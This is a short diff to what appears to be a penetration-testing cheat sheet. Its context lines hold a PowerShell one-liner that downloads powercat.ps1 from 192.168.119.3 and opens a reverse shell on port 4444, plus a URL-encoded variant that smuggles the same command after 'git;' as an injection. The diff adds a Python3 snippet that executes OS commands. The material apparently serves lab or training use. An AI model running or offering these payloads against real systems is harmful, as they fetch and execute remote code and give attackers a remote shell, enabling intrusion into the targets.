@@ -19,3 +19,7 @@ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powe
 IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
 urlencode(git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell)
 ```
+### Python3
+```
+__import__('os').system('cmd')
+```
